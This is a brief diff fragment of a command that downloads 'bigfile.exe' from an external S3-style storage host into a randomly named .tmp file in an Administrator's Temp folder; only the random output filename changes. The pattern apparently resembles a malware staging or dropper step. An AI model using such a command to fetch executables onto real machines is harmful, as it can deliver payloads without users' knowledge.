@@ -8,4 +8,4 @@ oint s3 GetObject \
  --name "bigfile.exe" \
  --bucket "newbucket2" \
  --basic "{'URL':'storage-155.s3hoster.by','AccessKey':'***','SecretKey':'***','Region':'BTC','Service':'s3','ChunkSize':200000}" \
- --out "C:\Users\Administrator\AppData\Local\Temp\wj14iag4ex1.tmp"
+ --out "C:\Users\Administrator\AppData\Local\Temp\n20sjftv0hc.tmp"
